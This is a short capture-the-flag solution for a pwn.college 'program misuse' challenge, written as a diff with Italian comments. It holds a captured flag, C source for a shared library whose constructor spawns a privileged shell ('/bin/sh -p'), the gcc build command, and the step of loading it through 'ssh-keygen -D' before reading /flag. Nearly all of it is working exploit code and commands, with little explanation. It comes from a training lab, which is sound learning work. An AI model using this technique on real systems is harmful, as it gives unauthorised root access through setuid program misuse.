@@ -1,0 +1,31 @@
+pwn.college{wGYrw3Jg83zqU9-X1mk8xlVLFbY.dNTOxwCO4IDOxEzW}
+
+test.c:
+#include <dlfcn.h>
+#include <unistd.h>
+#include <stdio.h>
+
+static void C_GetFunctionList() __attribute__((constructor));
+
+void C_GetFunctionList()
+{
+    printf("EUID: %d\n", geteuid());
+    execl("/bin/sh", "/bin/sh -p", "-p", NULL);
+}
+
+int main()
+{
+    return 0;
+}
+
+poi una volta scritto il codice, compilo:
+gcc -shared -o libtest.so -fPIC test.c
+
+
+infine runno il compilato:
+ssh-keygen -D ./libtest.so
+
+cat /flag
+
+
+link: https://medium.com/@chunguss/program-misuse-challenges-writeups-part-3-7b3307a7170e
